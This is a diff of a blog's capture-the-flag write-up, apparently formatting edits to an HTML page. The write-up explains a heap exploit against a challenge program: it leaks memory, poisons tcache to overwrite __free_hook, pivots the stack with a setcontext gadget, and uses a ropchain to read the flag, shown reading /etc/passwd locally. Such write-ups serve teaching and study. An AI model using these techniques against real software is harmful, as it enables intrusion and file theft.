@@ -185,32 +185,31 @@ Empty dream.
 <p>Firstly, when adding a <code>dream</code>, the content of the dream is read using the <code>read</code> function, which does not append a null byte to the string, and no null bytes are added to ensure that the strings is terminated.
 Thus, since the view functionnality prints a strings, it is possible to read any bytes following the content of a <code>dream</code> up until the first null byte encountered.</p>
 <p>The second vulnerability is in the edit functionality, when trying to add a null byte at the end of the string, as highlighted here :</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="">0</span>x000016d3      8b45f8         mov eax, <span style="color:#2b91af">dword</span> [rbp - 8]    <span style="color:#008000">; eax contains the index of the dream</span>
-<span style="">0</span>x000016d6      4898           cdqe
-<span style="">0</span>x000016d8      488d14850000.  lea rdx, [rax*4]
-<span style="">0</span>x000016e0      488d05092a00.  lea rax, obj.dreams_size
-<span style="">0</span>x000016e7      8b0402         mov eax, <span style="color:#2b91af">dword</span> [rdx + rax]  <span style="color:#008000">; eax = dream size</span>
-<span style="">0</span>x000016ea      4863d0         movsxd rdx, eax             <span style="color:#008000">; size argument of read (dream size)</span>
-<span style="">0</span>x000016ed      8b45f8         mov eax, <span style="color:#2b91af">dword</span> [rbp - 8]
-<span style="">0</span>x000016f0      4898           cdqe
-<span style="">0</span>x000016f2      488d0cc50000.  lea rcx, [rax*8]
-<span style="">0</span>x000016fa      488d05bf2900.  lea rax, obj.dreams
-<span style="">0</span>x00001701      488b0401       mov rax, <span style="color:#2b91af">qword</span> [rcx + rax]
-<span style="">0</span>x00001705      4889c6         mov rsi, rax                <span style="color:#008000">; address argument of read (address of the dream)</span>
-<span style="">0</span>x00001708      bf00000000     mov edi, 0                  <span style="color:#008000">; stdin</span>
-<span style="">0</span>x0000170d      e81efaffff     call sym.imp.read
-<span style="">0</span>x00001712      8945fc         mov <span style="color:#2b91af">dword</span> [rbp - 4], eax    <span style="color:#008000">; eax = number of bytes read</span>
-<span style="">0</span>x00001715      8b45f8         mov eax, <span style="color:#2b91af">dword</span> [rbp - 8]    <span style="color:#008000">; eax = index of the dream</span>
-<span style="">0</span>x00001718      4898           cdqe
-<span style="">0</span>x0000171a      488d14c50000.  lea rdx, [rax*8]
-<span style="">0</span>x00001722      488d05972900.  lea rax, obj.dreams
-<span style="">0</span>x00001729      488b1402       mov rdx, <span style="color:#2b91af">qword</span> [rdx + rax] <span style="color:#008000">; rdx = address of the corresponding dream</span>
-<span style="">0</span>x0000172d      8b45fc         mov eax, <span style="color:#2b91af">dword</span> [rbp - 4]   <span style="color:#008000">; eax = number of bytes read</span>
-<span style="">0</span>x00001730      4898           cdqe
-<span style="">0</span>x00001732      4801d0         add rax, rdx               <span style="color:#008000">; Calculates the address by adding the number of byte read to the beginning of the chunk</span>
-<span style="">0</span>x00001735      c60000         mov <span style="color:#2b91af">byte</span> [rax], 0          <span style="color:#008000">; Write the null byte, this can be out of the chunk!</span>
-
-</code></pre></div><p>Let&rsquo;s review it :</p>
+<pre><code class="language-x86asm" data-lang="x86asm">mov eax, dword [rbp - 8]    ; eax contains the index of the dream
+cdqe
+lea rdx, [rax*4]
+lea rax, obj.dreams_size
+mov eax, dword [rdx + rax]  ; eax = dream size
+movsxd rdx, eax             ; size argument of read (dream size)
+mov eax, dword [rbp - 8]
+cdqe
+lea rcx, [rax*8]
+lea rax, obj.dreams
+mov rax, qword [rcx + rax]
+mov rsi, rax                ; address argument of read (address of the dream)
+mov edi, 0                  ; stdin
+call sym.imp.read
+mov dword [rbp - 4], eax    ; eax = number of bytes read
+mov eax, dword [rbp - 8]    ; eax = index of the dream
+cdqe
+lea rdx, [rax*8]
+lea rax, obj.dreams
+mov rdx, qword [rdx + rax] ; rdx = address of the corresponding dream
+mov eax, dword [rbp - 4]   ; eax = number of bytes read
+cdqe
+add rax, rdx               ; Calculates the address by adding the number of byte read to the beginning of the chunk
+mov byte [rax], 0          ; Write the null byte, this can be out of the chunk!
+</code></pre><p>Let&rsquo;s review it :</p>
 <p>First, it calls <code>read</code> to edit the content of the dream, with the size parameter equal to the size given when we added the dream. Then, it takes the return value from <code>read</code>, which is the number of bytes read, and adds to it the address of the dream, and writes a null byte there.
 However, if we created a <code>dream</code> whose size was filling the content of the chunk given by <code>malloc</code>, when editing the chunk, we can write a null byte out of the chunk boundaries !</p>
 <p>With these two vulnerabilities, it is enough to exploit this program.</p>
@@ -385,7 +384,7 @@ edit(1, p64(0x012345679abcdef))  <span style="color:#008000"># Overwrite the poi
 ...
 Tcachebins[idx=5, size=0x70] count=1  ←  Chunk(addr=0x564c2d1037a0, size=0x70, flags=PREV_INUSE)  ←  [Corrupted chunk at 0x123456789abcdef]
 </code></pre><p>Allocating a new dream of the same size, we are left with our corrupted chunk, allocating once more, we get a segmentation fault !</p>
-<p>So we can write anywhere, but where do we want to write ? The goal is to control <code>rip</code>. The <code>got</code> is read-only, and we don&rsquo;t know its address. There isn&rsquo;t any pointer to function, so we are left with the libc.</p>
+<p>So we can write anywhere, but where do we want to write ? The goal is to control <code>rip</code>. The <code>got</code> is read-only, and we don&rsquo;t know its address. There isn&rsquo;t any pointer to function in the heap, so we are left with the libc.</p>
 <p>Great targets are hooks ! Hooks, such as <code>__malloc_hook</code> or <code>__free_hook</code>, are pointers to functions to call when the corresponding function in their name is called.
 Since we can trigger both of these functions, they seem like good targets.</p>
 <p>Let&rsquo;s modify our script to overwrite <code>__free_hook</code> (I&rsquo;ll come back to why <code>__free_hook</code> rather than <code>malloc_hook</code> just after) :</p>
@@ -400,30 +399,30 @@ add(0x60, p64(0x0123456789abcdef)) <span style="color:#008000"># overwrite __fre
 </code></pre></div><p>Now, calling free triggers a segfault, with <code>rip</code> equals to <code>0x0123456789abcdef</code> ! We can control <code>rip</code>.</p>
 <h2 id="stack-pivoting">Stack pivoting</h2>
 <p>Now we can control the execution, but where do we want to go ? Remember that there is a seccomp whitelist ! Without it, we could try to call a <a href="https://github.com/david942j/one_gadget">one gadget</a> and get a shell, but here <code>execve</code> and others are not allowed.</p>
-<p>The only thing that the whitelisted syscalls let us do, are <code>open,</code> <code>read</code> and <code>write</code> on the flag file.
+<p>The only interesting thing that the whitelisted syscalls let us do, are <code>open,</code> <code>read</code> and <code>write</code> on the flag file.
 For this to work, we need to be able to execute at least a ropchain, at best a shellcode, so let&rsquo;s start with a ropchain.</p>
 <p>But we don&rsquo;t control the values on the stack ! So, in order to ROP, we will need to do what is called a stack pivot, which is a (long) gadget which will let us control the <code>rsp</code> register, which we will set to a known location where we will previously have written a ropchain. This ropchain will be written on the heap, this is why we needed to leak the base address of the heap in the first place.</p>
-<p>But how do we set the <code>rsp</code> value if we don&rsquo;t control the stack, and there is no gadget which will change <code>rsp</code> to a heap address on its own. This is the reason why I chose <code>__free_hook</code> over <code>__malloc_hook</code> : the only argument given to a call to <code>malloc</code> is a size, an the function pointed by <code>__malloc_hook</code> is called before the actual chunk allocation, so we end up with a size in the <code>rdi</code> register, which is not very interesting for us.
+<p>But how do we set the <code>rsp</code> value if we don&rsquo;t control the stack ? There is no gadget which will change <code>rsp</code> to a heap address on its own. This is the reason why I chose <code>__free_hook</code> over <code>__malloc_hook</code> : the only argument given to a call to <code>malloc</code> is a size, and as the function pointed by <code>__malloc_hook</code> is called before the actual chunk allocation, so we end up with a size in the <code>rdi</code> register, which is not very interesting for us.
 However, the argument to <code>free</code> is a pointer to the chunk we are trying to free, so when our gadget is called, we control the values at <code>[rdi + 0x??]</code>. This is enough to do a stack pivot.</p>
 <p>Where do we find this gadget ? In the libc ! (We don&rsquo;t even know the base address of the binary). There are <em>many</em> gadgets in a libc, so finding exactly what we want can take some time. There is a well-known gadget in the <code>setcontext</code> function in this version of the libc.</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="">0</span>x000521b5      488ba7a00000.  mov rsp, <span style="color:#2b91af">qword</span> [rdi + 0xa0]
-<span style="">0</span>x000521bc      488b9f800000.  mov rbx, <span style="color:#2b91af">qword</span> [rdi + 0x80]
-<span style="">0</span>x000521c3      488b6f78       mov rbp, <span style="color:#2b91af">qword</span> [rdi + 0x78]
-<span style="">0</span>x000521c7      4c8b6748       mov r12, <span style="color:#2b91af">qword</span> [rdi + 0x48]
-<span style="">0</span>x000521cb      4c8b6f50       mov r13, <span style="color:#2b91af">qword</span> [rdi + 0x50]
-<span style="">0</span>x000521cf      4c8b7758       mov r14, <span style="color:#2b91af">qword</span> [rdi + 0x58]
-<span style="">0</span>x000521d3      4c8b7f60       mov r15, <span style="color:#2b91af">qword</span> [rdi + 0x60]
-<span style="">0</span>x000521d7      488b8fa80000.  mov rcx, <span style="color:#2b91af">qword</span> [rdi + 0xa8]
-<span style="">0</span>x000521de      51             push rcx
-<span style="">0</span>x000521df      488b7770       mov rsi, <span style="color:#2b91af">qword</span> [rdi + 0x70]
-<span style="">0</span>x000521e3      488b97880000.  mov rdx, <span style="color:#2b91af">qword</span> [rdi + 0x88]
-<span style="">0</span>x000521ea      488b8f980000.  mov rcx, <span style="color:#2b91af">qword</span> [rdi + 0x98]
-<span style="">0</span>x000521f1      4c8b4728       mov r8, <span style="color:#2b91af">qword</span> [rdi + 0x28]
-<span style="">0</span>x000521f5      4c8b4f30       mov r9, <span style="color:#2b91af">qword</span> [rdi + 0x30]
-<span style="">0</span>x000521f9      488b7f68       mov rdi, <span style="color:#2b91af">qword</span> [rdi + 0x68]
-<span style="">0</span>x000521fd      31c0           xor eax, eax
-<span style="">0</span>x000521ff      c3             ret
-</code></pre></div><p>We can control the value of many registers, including <code>rsp</code>, we just have to remember to put in <code>rcx</code> the address of the next gadget to start the ropchain - because it will be push on the stack, this is the value that the <code>ret</code> instruction will pop and execute.</p>
+<pre><code class="language-x86asm" data-lang="x86asm">0x000521b5      488ba7a00000.  mov rsp, qword [rdi + 0xa0]
+0x000521bc      488b9f800000.  mov rbx, qword [rdi + 0x80]
+0x000521c3      488b6f78       mov rbp, qword [rdi + 0x78]
+0x000521c7      4c8b6748       mov r12, qword [rdi + 0x48]
+0x000521cb      4c8b6f50       mov r13, qword [rdi + 0x50]
+0x000521cf      4c8b7758       mov r14, qword [rdi + 0x58]
+0x000521d3      4c8b7f60       mov r15, qword [rdi + 0x60]
+0x000521d7      488b8fa80000.  mov rcx, qword [rdi + 0xa8]
+0x000521de      51             push rcx
+0x000521df      488b7770       mov rsi, qword [rdi + 0x70]
+0x000521e3      488b97880000.  mov rdx, qword [rdi + 0x88]
+0x000521ea      488b8f980000.  mov rcx, qword [rdi + 0x98]
+0x000521f1      4c8b4728       mov r8, qword [rdi + 0x28]
+0x000521f5      4c8b4f30       mov r9, qword [rdi + 0x30]
+0x000521f9      488b7f68       mov rdi, qword [rdi + 0x68]
+0x000521fd      31c0           xor eax, eax
+0x000521ff      c3             ret
+</code></pre><p>We can control the value of many registers, including <code>rsp</code>, we just have to remember to put in <code>rcx</code> the address of the next gadget to start the ropchain - because it will be push on the stack, this is the value that the <code>ret</code> instruction will pop and execute.</p>
 <p>Let&rsquo;s update our script and start the ropchain (and change the random string to the path to the flag, we will use this later) :</p>
 <div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">free_hook = libc_base + libc.symbols[<span style="color:#a31515">&#39;__free_hook&#39;</span>]
 gadget = libc_base + 0x521b5                          <span style="color:#008000"># The address of the setcontext gadget</span>
@@ -516,20 +515,20 @@ ropchain += p64(read)
 
 ropchain += p64(pop_rdi)			      <span style="color:#008000"># address of the data read</span>
 ropchain += p64(heap_base)
-ropchain += p64(puts)
+ropchain += p64(puts)				      <span style="color:#008000"># prints out the data read</span>
 
 
 add(0x800, ropchain)
 delete(5)                                             <span style="color:#008000"># triggers __free_hook with a pointer to our chunk with the ropchain in rdi</span>
 </code></pre></div><p>This works ! At the time of writing, the server is not up anymore, however running it locally and changing the flag path to <code>/etc/passwd</code> gives the expected output :</p>
-<pre><code class="language-raw" data-lang="raw">$ python3 test.py
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python3 test.py
 ...
 [+] heap base : 0x559520a93000
 [+] libc base : 0x7f0645cf0000
 [*] Switching to interactive mode
-root❌0:0::/root:/bin/bash
+root:x:0:0::/root:/bin/bash
 ...
-</code></pre><p>When running it remotely, I just had to change the fd of the open file to be 5 instead of 3, probably because the program had additionnal open file descriptors due to the remote connexion.</p>
+</code></pre></div><p>When running it remotely, I just had to change the fd of the open file to be 5 instead of 3, probably because the program had additionnal open file descriptors due to the remote connexion.</p>
 <p>This was a nice challenge :)</p>
 <h2 id="full-exploit">Full exploit</h2>
 <div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#00f">from</span> pwn <span style="color:#00f">import</span> *
@@ -696,7 +695,11 @@ p.interactive()
         
             <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.2.0/languages/c.min.js" defer></script>
         
-            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.2.0/languages/asm.min.js" defer></script>
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.2.0/languages/x86asm.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.2.0/languages/armasm.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.2.0/languages/bash.min.js" defer></script>
         
         <script>
             window.addEventListener('load', function() {
